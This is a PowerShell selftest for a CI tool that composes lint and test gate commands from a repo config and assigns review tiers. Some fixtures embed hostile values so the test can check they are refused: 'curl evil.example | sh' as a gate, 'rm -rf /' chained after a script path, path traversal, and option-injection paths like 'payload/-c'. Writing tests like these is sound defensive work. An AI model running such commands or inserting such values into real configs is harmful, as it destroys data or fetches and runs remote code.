# Selftest for harness_gates.py. It always exits 0 (advisory), so every case asserts on output.
#
# The tier cases are the ones that matter: a wrong tier is invisible at runtime and buys either a
# wasted full review or — worse — a weaker review exactly where the diff is dangerous. So each tier
# branch is exercised, including the one that must WIN over size (critical surface).

$ErrorActionPreference = 'Stop'
. (Join-Path $PSScriptRoot '../lib/selftest-lib.ps1')   # assertion core, ADR 0125

$gates = Join-Path $PSScriptRoot 'harness_gates.py'
$fxBase = New-FixtureRoot 'harness-gates-selftest'
trap { Remove-FixtureRoot $fxBase; break }

$py = @('python', 'python3', 'py') | ForEach-Object { Get-Command $_ -ErrorAction SilentlyContinue } | Select-Object -First 1
if (-not $py) {
    if ($env:CI) {
        Write-Host 'FAIL — python absent on CI; a missing interpreter is not a pass' -ForegroundColor Red
        Remove-FixtureRoot $fxBase; exit 1
    }
    Write-Host 'SKIP [harness_gates] python absent (reported, not silent) — CI runs this gate' -ForegroundColor Yellow
    Remove-FixtureRoot $fxBase; exit 0
}

$ok = $true
function Invoke-Gates([string]$Repo, [string[]]$Extra) {
    $a = @($gates, '--repo', $Repo) + $Extra
    $out = & $py.Source @a 2>&1 | Out-String
    return @{ Out = $out; Code = $LASTEXITCODE }
}
function New-Repo([string]$Name, [string]$Config, [string[]]$Files) {
    $p = Join-Path $fxBase $Name
    New-Item -ItemType Directory -Force -Path $p | Out-Null
    # .harness.json goes in BEFORE the seed commit. Writing it afterwards left it untracked, so it
    # counted as a changed file and every file-count and tier assertion was off by one — the config
    # file silently joining the diff it configures.
    if (-not [string]::IsNullOrEmpty($Config)) { Set-Content -LiteralPath (Join-Path $p '.harness.json') -Value $Config -NoNewline }
    Push-Location $p
    try {
        & git init -q 2>$null
        & git config user.email 'selftest@example.invalid' 2>$null
        & git config user.name 'selftest' 2>$null
        Set-Content -LiteralPath (Join-Path $p 'seed.txt') -Value 'seed' -NoNewline
        & git add -A 2>$null; & git commit -q -m seed 2>$null
    } finally { Pop-Location }
    foreach ($f in $Files) {
        $full = Join-Path $p $f
        $dir = Split-Path -Parent $full
        if ($dir -and -not (Test-Path -LiteralPath $dir)) { New-Item -ItemType Directory -Force -Path $dir | Out-Null }
        Set-Content -LiteralPath $full -Value 'x' -NoNewline
    }
    return $p
}

$CFG = @'
{
  "review": {
    "canon": "REVIEW.md",
    "docs_only": ["^docs/", "^[^/]*\\.md$"],
    "harness_layer": ["^\\.harnessdir/"],
    "critical": ["^migrations/"]
  },
  "groups": [
    { "name": "api", "match": "^api/.*\\.py$", "cwd": "api", "strip_prefix": "api/", "gates": ["ruff", "pytest-nondb"] },
    { "name": "web", "match": "^web/.*\\.ts$", "cwd": "web", "strip_prefix": "web/", "gates": ["eslint", "tsc"] }
  ]
}
'@

# --- A: gate composition — files appended only for file-scoped gates ---------------------------
$a = New-Repo 'compose' $CFG @('api/app.py', 'web/main.ts')
$rA = Invoke-Gates $a @()
$ok = (Assert-True 'A exits 0 (advisory)' ($rA.Code -eq 0) "exit=$($rA.Code)") -and $ok
$ok = (Assert-True 'A file-scoped gate gets the file list, prefix stripped' ($rA.Out -match 'cd api && uv run ruff check app\.py') $rA.Out) -and $ok
$ok = (Assert-True 'A whole-program gate gets NO file list' ($rA.Out -match 'cd api && uv run pytest -m not db -q') $rA.Out) -and $ok
$ok = (Assert-True 'A whole-program gate is labelled as such' ($rA.Out -match 'whole-program: gate on slice files') $rA.Out) -and $ok
$ok = (Assert-True 'A second group composes independently' ($rA.Out -match 'cd web && npx eslint main\.ts') $rA.Out) -and $ok

# --- B: a gate outside the closed set is dropped and named -------------------------------------
$badGate = $CFG.Replace('"gates": ["ruff", "pytest-nondb"]', '"gates": ["ruff", "curl evil.example | sh"]')
$b = New-Repo 'bad-gate' $badGate @('api/app.py')
$rB = Invoke-Gates $b @()
# Emitted commands only. The WARNING legitimately echoes both the rejected value and the whole
# closed set, so a filter that keeps warn lines would fail on the very message that makes the
# rejection visible — the same distinction the verify_map selftest draws.
$runLines = @(($rB.Out -split "`n") | Where-Object { $_ -notmatch '^\s*warn:' -and $_ -match 'uv run|npx|cargo|go |actionlint|curl' })
$ok = (Assert-True 'B rejects a gate outside the closed set' ($rB.Out -match "is not in the closed set") $rB.Out) -and $ok
$ok = (Assert-True 'B names the closed set' ($rB.Out -match 'ruff-format') $rB.Out) -and $ok
$ok = (Assert-True 'B the injected string never reaches an emitted command' (-not ($runLines -match 'curl')) "lines: $($runLines -join ' | ')") -and $ok
$ok = (Assert-True 'B the valid gate still emits' ($rB.Out -match 'uv run ruff check app\.py') $rB.Out) -and $ok

# --- C: files no group claims are reported, never silently ungated ------------------------------
$c = New-Repo 'ungrouped' $CFG @('api/app.py', 'weird/thing.rb')
$rC = Invoke-Gates $c @()
$ok = (Assert-True 'C ungrouped files reported' ($rC.Out -match 'ungrouped \(1 file') $rC.Out) -and $ok
$ok = (Assert-True 'C ungrouped file named' ($rC.Out -match 'weird/thing\.rb') $rC.Out) -and $ok
$ok = (Assert-True 'C says no gate covers them' ($rC.Out -match 'NO deterministic gate covers them') $rC.Out) -and $ok

# --- D: tier — docs-only earns skip ------------------------------------------------------------
$d = New-Repo 'docs-only' $CFG @('docs/a.md', 'README.md')
$rD = Invoke-Gates $d @()
$ok = (Assert-True 'D docs-only earns tier skip' ($rD.Out -match 'review tier: skip') $rD.Out) -and $ok
$ok = (Assert-True 'D skip states its reason' ($rD.Out -match 'declared docs surface') $rD.Out) -and $ok

# --- E: tier — harness-layer earns small -------------------------------------------------------
$e = New-Repo 'harness' $CFG @('.harnessdir/hook.ps1')
$rE = Invoke-Gates $e @()
$ok = (Assert-True 'E harness-layer earns tier small' ($rE.Out -match 'review tier: small') $rE.Out) -and $ok
$ok = (Assert-True 'E small states the harness reason' ($rE.Out -match 'confined to the declared harness layer') $rE.Out) -and $ok

# --- F: tier — a critical surface WINS over a small size ---------------------------------------
# One tiny file. Size alone would say small; criticality must override it.
$f = New-Repo 'critical' $CFG @('migrations/001.sql')
$rF = Invoke-Gates $f @()
$ok = (Assert-True 'F critical surface forces tier full' ($rF.Out -match 'review tier: full') $rF.Out) -and $ok
$ok = (Assert-True 'F says size never overrides criticality' ($rF.Out -match 'size never overrides criticality') $rF.Out) -and $ok
$ok = (Assert-True 'F names the critical file' ($rF.Out -match 'migrations/001\.sql') $rF.Out) -and $ok

# --- G: tier — size-based small vs full --------------------------------------------------------
$g = New-Repo 'small-size' $CFG @('api/app.py')
$rG = Invoke-Gates $g @()
$ok = (Assert-True 'G small diff earns tier small with counts' ($rG.Out -match 'review tier: small — 1 file\(s\) / \d+ changed line\(s\)') $rG.Out) -and $ok

$manyFiles = 1..7 | ForEach-Object { "api/f$_.py" }
$g2 = New-Repo 'big-size' $CFG $manyFiles
$rG2 = Invoke-Gates $g2 @()
$ok = (Assert-True 'G2 too many files earns tier full' ($rG2.Out -match 'review tier: full — 7 file\(s\)') $rG2.Out) -and $ok

# --- H: undeclared review surfaces warn rather than pretending -----------------------------------
$h = New-Repo 'no-surfaces' '{ "groups": [] }' @('api/app.py')
$rH = Invoke-Gates $h @()
$ok = (Assert-True 'H no declared surfaces warns the tier rests on size' ($rH.Out -match 'no review surfaces declared') $rH.Out) -and $ok
$ok = (Assert-True 'H still exits 0' ($rH.Code -eq 0) "exit=$($rH.Code)") -and $ok

# --- I: a missing review canon is named, not assumed -------------------------------------------
$ok = (Assert-True 'I missing review canon is called out' ($rA.Out -match 'NOT FOUND') $rA.Out) -and $ok
Set-Content -LiteralPath (Join-Path $a 'REVIEW.md') -Value '# invariants' -NoNewline
$rI = Invoke-Gates $a @()
$ok = (Assert-True 'I present review canon is not flagged' ($rI.Out -notmatch 'NOT FOUND') $rI.Out) -and $ok

# --- J: non-ASCII output survives a hostile console codepage ------------------------------------
$prevIo = $env:PYTHONIOENCODING
$env:PYTHONIOENCODING = 'cp1252'
try { $rJ = Invoke-Gates $a @() }
finally {
    if ($null -eq $prevIo) { Remove-Item Env:PYTHONIOENCODING -ErrorAction SilentlyContinue } else { $env:PYTHONIOENCODING = $prevIo }
}
$ok = (Assert-True 'J separator survives an inherited cp1252 encoding' ($rJ.Out -match '·') $rJ.Out) -and $ok
$ok = (Assert-True 'J tier reason em dash survives' ($rJ.Out -match 'review tier: \w+ — ') $rJ.Out) -and $ok

# --- K: the hooks drift report (ADR 0015) -------------------------------------------------------
# core.hooksPath is per-clone and never committed, so a repo can carry .githooks/ while THIS clone
# runs none of it. Without this line the two states are indistinguishable, which is the whole reason
# the conditional wiring in init.ps1 is not sufficient on its own.
$k = New-Repo 'hooks-report' $CFG @('api/app.py')
$rK0 = Invoke-Gates $k @()
$ok = (Assert-True 'K0 no .githooks/ means no hooks line at all' ($rK0.Out -notmatch 'hooks:') $rK0.Out) -and $ok

New-Item -ItemType Directory -Force -Path (Join-Path $k '.githooks') | Out-Null
Set-Content -LiteralPath (Join-Path $k '.githooks/pre-commit') -Value '#!/bin/sh' -NoNewline
$rK1 = Invoke-Gates $k @()
$ok = (Assert-True 'K1 unwired clone is reported' ($rK1.Out -match 'hooks: .*core\.hooksPath is UNSET') $rK1.Out) -and $ok
$ok = (Assert-True 'K1 the fix is spelled out' ($rK1.Out -match 'git config core\.hooksPath \.githooks') $rK1.Out) -and $ok
$ok = (Assert-True 'K1 still advisory (exit 0)' ($rK1.Code -eq 0) "exit=$($rK1.Code)") -and $ok

& git -C $k config --local core.hooksPath '.githooks' 2>$null
$rK2 = Invoke-Gates $k @()
$ok = (Assert-True 'K2 wired clone says so' ($rK2.Out -match 'hooks: \.githooks/ wired') $rK2.Out) -and $ok
$ok = (Assert-True 'K2 wired clone stops nagging' ($rK2.Out -notmatch 'UNSET') $rK2.Out) -and $ok

& git -C $k config --local core.hooksPath '.elsewhere' 2>$null
$rK3 = Invoke-Gates $k @()
$ok = (Assert-True 'K3 a foreign hooksPath is reported, not called wired' ($rK3.Out -match "points at '\.elsewhere'") $rK3.Out) -and $ok

# The hook's output parser stops at `review tier:`; if the hooks line ever moved above it, a
# scaffolded repo would try to execute it as a gate command.
$ok = (Assert-True 'K4 hooks line stays below the tier line' (($rK2.Out -split 'review tier:').Count -eq 2 -and ($rK2.Out -split 'review tier:')[1] -match 'hooks:') $rK2.Out) -and $ok

# --- L: script gates (ADR 0024) — closed-set runner + validated repo path ----------------------
$CFG_SCRIPT = @'
{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "ps", "match": "^tools/.*\\.ps1$", "cwd": "", "strip_prefix": "",
      "gates": [ { "runner": "pwsh", "script": "tools/selftest.ps1", "files": false } ] },
    { "name": "py", "match": "^pysrc/.*\\.py$", "cwd": "pysrc", "strip_prefix": "pysrc/",
      "gates": [ { "runner": "python", "script": "pysrc/gate.py", "files": true } ] }
  ]
}
'@
$l = New-Repo 'script-gate' $CFG_SCRIPT @('tools/selftest.ps1', 'pysrc/gate.py', 'pysrc/app.py')
$rL = Invoke-Gates $l @()
$ok = (Assert-True 'L whole-program script gate composes runner template + path' ($rL.Out -match 'pwsh -NoProfile -File tools/selftest\.ps1\s+# whole-program') $rL.Out) -and $ok
$ok = (Assert-True 'L file-scoped script gate appends files, strip_prefix on script AND files' ($rL.Out -match 'cd pysrc && python gate\.py app\.py gate\.py') $rL.Out) -and $ok
$ok = (Assert-True 'L an existing script draws no missing-path warning' ($rL.Out -notmatch 'does not exist') $rL.Out) -and $ok

# --- M: script-gate validation — refused values are echoed but never composed -------------------
$CFG_BAD_SCRIPT = @'
{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "ps", "match": "^tools/", "cwd": "", "strip_prefix": "", "gates": [
      { "runner": "bash", "script": "tools/ok.ps1" },
      { "runner": "pwsh", "script": "tools/x.ps1; rm -rf /" },
      { "runner": "pwsh", "script": "/etc/evil.ps1" },
      { "runner": "pwsh", "script": "../outside.ps1" },
      { "runner": "pwsh", "script": "-oops.ps1" },
      { "runner": "pwsh", "script": "tools/*.ps1" },
      { "runner": "pwsh", "script": "tools/none.ps1" },
      { "runner": "pwsh", "script": "tools/ok.ps1" }
    ] }
  ]
}
'@
$m = New-Repo 'script-gate-bad' $CFG_BAD_SCRIPT @('tools/ok.ps1')
$rM = Invoke-Gates $m @()
# Emitted commands only — the warnings legitimately echo every refused value (same split as case B).
$mRun = @(($rM.Out -split "`n") | Where-Object { $_ -notmatch '^\s*warn:' -and $_ -match '^\s{4}[^ (]' })
$ok = (Assert-True 'M runner outside the closed set is dropped and the set named' ($rM.Out -match "script-gate runner 'bash' is not in the closed set" -and $rM.Out -match 'python-uv') $rM.Out) -and $ok
$ok = (Assert-True 'M a metacharacter path is refused and echoed in the warning' ($rM.Out -match 'rm -rf') $rM.Out) -and $ok
$ok = (Assert-True 'M no refused value reaches an emitted command' (-not ($mRun -match 'rm -rf|/etc/evil|\.\./outside|bash')) "lines: $($mRun -join ' | ')") -and $ok
$ok = (Assert-True 'M an absolute path is refused' ($rM.Out -match "'/etc/evil\.ps1' refused") $rM.Out) -and $ok
$ok = (Assert-True 'M a ''..'' path is refused' ($rM.Out -match "'\.\./outside\.ps1' refused") $rM.Out) -and $ok
$ok = (Assert-True 'M a leading-dash path is refused (a value in command position parsed as an option — case I2 class)' ($rM.Out -match "'-oops\.ps1' refused") $rM.Out) -and $ok
$ok = (Assert-True 'M a glob path is refused (CI runs sh -c without set -f)' ($rM.Out -match "'tools/\*\.ps1' refused") $rM.Out) -and $ok
$ok = (Assert-True 'M a missing script warns but the command still emits (typo must not read as coverage)' ($rM.Out -match "'tools/none\.ps1' does not exist" -and $rM.Out -match 'pwsh -NoProfile -File tools/none\.ps1') $rM.Out) -and $ok
$ok = (Assert-True 'M the valid script gate still emits' ([bool]($mRun -match 'pwsh -NoProfile -File tools/ok\.ps1')) "lines: $($mRun -join ' | ')") -and $ok

# --- N: an identical composed command emits once, deduplicated visibly --------------------------
# A whole-program script gate declared on several groups would otherwise run once per group in CI.
$CFG_DUP = @'
{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "a", "match": "^a/", "cwd": "", "strip_prefix": "",
      "gates": [ { "runner": "pwsh", "script": "tools/all.ps1", "files": false } ] },
    { "name": "b", "match": "^b/", "cwd": "", "strip_prefix": "",
      "gates": [ { "runner": "pwsh", "script": "tools/all.ps1", "files": false } ] }
  ]
}
'@
$n = New-Repo 'script-gate-dup' $CFG_DUP @('a/x.txt', 'b/y.txt', 'tools/all.ps1')
$rN = Invoke-Gates $n @()
$nEmit = @(($rN.Out -split "`n") | Where-Object { $_ -match '^\s{4}[^ (]' -and $_ -match 'tools/all\.ps1' })
$ok = (Assert-True 'N the duplicate command emits exactly once' ($nEmit.Count -eq 1) "emitted $($nEmit.Count)x: $($nEmit -join ' | ')") -and $ok
$ok = (Assert-True 'N the dedupe is visible, not silent' ($rN.Out -match 'already emitted above — deduplicated') $rN.Out) -and $ok
$ok = (Assert-True 'N the dedupe note is parenthesized so both output parsers skip it' ($rN.Out -match '\n    \(already emitted above') $rN.Out) -and $ok

# --- O: THE strip_prefix ESCAPE — validation must run on the token that becomes argv -----------
# Found by adversarial review 2026-07-29 (three independent lenses, 0 of 6 skeptics refuted), and
# invisible to cases L and M: L strips a prefix off an ordinary filename, M refuses a leading dash
# only with strip_prefix EMPTY. Combined, a declared path that passes validation composes to a bare
# interpreter flag — and with files:true the next argv token is a changed FILENAME, which
# `python -c` / `node -e` execute as source. Both consumers run emitted commands through `sh -c`.
$CFG_ESCAPE = @'
{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "evil", "match": "^payload/", "cwd": "", "strip_prefix": "payload/",
      "gates": [ { "runner": "python", "script": "payload/-c", "files": true } ] },
    { "name": "evil2", "match": "^pysrc/", "cwd": "", "strip_prefix": "pysrc/",
      "gates": [ { "runner": "node", "script": "pysrc/-e", "files": true } ] }
  ]
}
'@
$o = New-Repo 'strip-escape' $CFG_ESCAPE @('payload/harmless.py', 'pysrc/harmless.js')
$rO = Invoke-Gates $o @()
$oRun = @(($rO.Out -split "`n") | Where-Object { $_ -notmatch '^\s*warn:' -and $_ -match '^\s{4}[^ (]' })
$ok = (Assert-True 'O a path that composes to a bare flag under strip_prefix is REFUSED' ($rO.Out -match "under strip_prefix 'payload/' it composes to '-c'") $rO.Out) -and $ok
$ok = (Assert-True 'O the refusal explains the option-injection reason' ($rO.Out -match "read as an option to the runner") $rO.Out) -and $ok
$ok = (Assert-True 'O node -e is refused the same way' ($rO.Out -match "composes to '-e'") $rO.Out) -and $ok
$ok = (Assert-True 'O NO emitted command contains a bare interpreter flag' (-not ($oRun -match '(python|node)\s+-[ce](\s|$)')) "lines: $($oRun -join ' | ')") -and $ok
$ok = (Assert-True 'O the refused gates emit nothing at all' ($rO.Out -match 'no declared group matched, or matched groups declare no gates') $rO.Out) -and $ok

# --- P: a changed FILENAME is repo-supplied text too --------------------------------------------
# A file whose name carries a leading dash is neutralized (./-name) rather than handed over as an
# option; one carrying sh metacharacters cannot be an argument at all, so it is EXCLUDED and the
# coverage loss is stated. `sh -c` re-splits, and both output parsers truncate at '#'.
$CFG_FILES = @'
{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "py", "match": "^src/", "cwd": "", "strip_prefix": "src/", "gates": ["ruff"] }
  ]
}
'@
$p = New-Repo 'hostile-filenames' $CFG_FILES @('src/-rf.py', 'src/ok.py')
# Names git tracks happily and `sh -c` would re-split or truncate. Created here rather than in
# New-Repo's list so the awkward characters never pass through a Join-Path round trip.
Set-Content -LiteralPath (Join-Path $p 'src/a b.py') -Value 'x' -NoNewline
Set-Content -LiteralPath (Join-Path $p 'src/c#d.py') -Value 'x' -NoNewline
$rP = Invoke-Gates $p @()
$pRun = @(($rP.Out -split "`n") | Where-Object { $_ -notmatch '^\s*warn:' -and $_ -match '^\s{4}[^ (]' })
$ok = (Assert-True 'P a leading-dash filename is neutralized with ./, never passed bare' (($pRun -match '\./-rf\.py') -and -not ($pRun -match '(check|ruff)\s+-rf\.py')) "lines: $($pRun -join ' | ')") -and $ok
$ok = (Assert-True 'P a filename with a space is excluded from the arguments' (-not ($pRun -match 'a b\.py')) "lines: $($pRun -join ' | ')") -and $ok
$ok = (Assert-True 'P a filename with # is excluded (both parsers truncate at #)' (-not ($pRun -match 'c#d\.py')) "lines: $($pRun -join ' | ')") -and $ok
$ok = (Assert-True 'P the exclusion is reported as an ungated coverage loss' ($rP.Out -match 'EXCLUDED from this group''s gate arguments' -and $rP.Out -match 'are UNGATED') $rP.Out) -and $ok
$ok = (Assert-True 'P each excluded file is named' ($rP.Out -match 'excluded: src/a b\.py' -and $rP.Out -match 'excluded: src/c#d\.py') $rP.Out) -and $ok
$ok = (Assert-True 'P the exclusion lines are parenthesized so neither parser runs them' (($rP.Out -split "`n" | Where-Object { $_ -match 'excluded:' } | Where-Object { $_ -notmatch '^\s*\(|^\s{4}\(' }).Count -eq 0) $rP.Out) -and $ok
$ok = (Assert-True 'P the safe file is still gated' ([bool]($pRun -match 'uv run ruff check.*ok\.py')) "lines: $($pRun -join ' | ')") -and $ok
# '..' is traversal only as a path SEGMENT. A file honestly named a..b.py must stay gated —
# a substring rule here would silently ungate real files to guard against nothing.
Set-Content -LiteralPath (Join-Path $p 'src/a..b.py') -Value 'x' -NoNewline
$rP2 = Invoke-Gates $p @()
$p2Run = @(($rP2.Out -split "`n") | Where-Object { $_ -notmatch '^\s*warn:' -and $_ -match '^\s{4}[^ (]' })
$ok = (Assert-True 'P2 a dotted filename is not mistaken for traversal' ([bool]($p2Run -match 'a\.\.b\.py')) "lines: $($p2Run -join ' | ')") -and $ok
$ok = (Assert-True 'P2 it is not reported as excluded either' ($rP2.Out -notmatch 'excluded: src/a\.\.b\.py') $rP2.Out) -and $ok

# --- Q: excluding EVERY file must not escalate the gate to the whole tree -----------------------
# A file-scoped gate with no file list is a whole-tree run (`ruff check` lints everything). So a
# group whose every changed filename is unusable as an argument must SKIP its gate, not emit a bare
# one — otherwise the exclusion silently widens scope instead of narrowing it.
$q = New-Repo 'all-files-excluded' $CFG_FILES @('src/keep.txt')
Set-Content -LiteralPath (Join-Path $q 'src/a b.py') -Value 'x' -NoNewline
Set-Content -LiteralPath (Join-Path $q 'src/c d.py') -Value 'x' -NoNewline
Remove-Item -LiteralPath (Join-Path $q 'src/keep.txt')
$rQ = Invoke-Gates $q @()
$qRun = @(($rQ.Out -split "`n") | Where-Object { $_ -notmatch '^\s*warn:' -and $_ -match '^\s{4}[^ (]' })
$ok = (Assert-True 'Q no bare whole-tree command is emitted' (-not ($qRun -match 'ruff check\s*$')) "lines: $($qRun -join ' | ')") -and $ok
$ok = (Assert-True 'Q the gate is reported as skipped, with the reason' ($rQ.Out -match 'skipped — none of this group''s changed files can be a command argument') $rQ.Out) -and $ok
$ok = (Assert-True 'Q the skip is parenthesized so neither parser runs it' ($rQ.Out -match '\n    \(skipped — ') $rQ.Out) -and $ok
$ok = (Assert-True 'Q a skipped gate does not count as emitted' ($rQ.Out -match 'none — no declared group matched, or matched groups declare no gates') $rQ.Out) -and $ok

# --- R: cwd reaches a command position too (`cd <cwd> && …`) ------------------------------------
# safe_path permits a space, '#' and '*'; none of those survives `sh -c` or the output parsers.
$CFG_CWD = @'
{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "spacey", "match": "^app/", "cwd": "my dir", "strip_prefix": "app/", "gates": ["ruff"] },
    { "name": "globby", "match": "^lib/", "cwd": "a*b", "strip_prefix": "lib/", "gates": ["ruff"] },
    { "name": "fine", "match": "^ok/", "cwd": "sub/dir", "strip_prefix": "ok/", "gates": ["ruff"] }
  ]
}
'@
$r = New-Repo 'hostile-cwd' $CFG_CWD @('app/x.py', 'lib/y.py', 'ok/z.py')
$rR = Invoke-Gates $r @()
$rRun = @(($rR.Out -split "`n") | Where-Object { $_ -notmatch '^\s*warn:' -and $_ -match '^\s{4}[^ (]' })
$ok = (Assert-True 'R a cwd with a space is refused, not composed' (-not ($rRun -match 'cd my dir')) "lines: $($rRun -join ' | ')") -and $ok
$ok = (Assert-True 'R a cwd with a glob is refused, not composed' (-not ($rRun -match 'cd a\*b')) "lines: $($rRun -join ' | ')") -and $ok
$ok = (Assert-True 'R the refusal says commands now run from the repo root' ($rR.Out -match 'run from the repo root') $rR.Out) -and $ok
$ok = (Assert-True 'R a refused cwd still emits the gate itself (no silent coverage loss)' ([bool]($rRun -match '^\s{4}uv run ruff check x\.py')) "lines: $($rRun -join ' | ')") -and $ok
$ok = (Assert-True 'R a clean cwd is still composed' ([bool]($rRun -match 'cd sub/dir && uv run ruff check z\.py')) "lines: $($rRun -join ' | ')") -and $ok

Remove-FixtureRoot $fxBase

if (-not $ok) { Write-Host 'harness_gates selftest: FAILED' -ForegroundColor Red; exit 1 }
Write-Host 'harness_gates selftest: all cases green' -ForegroundColor Green
exit 0
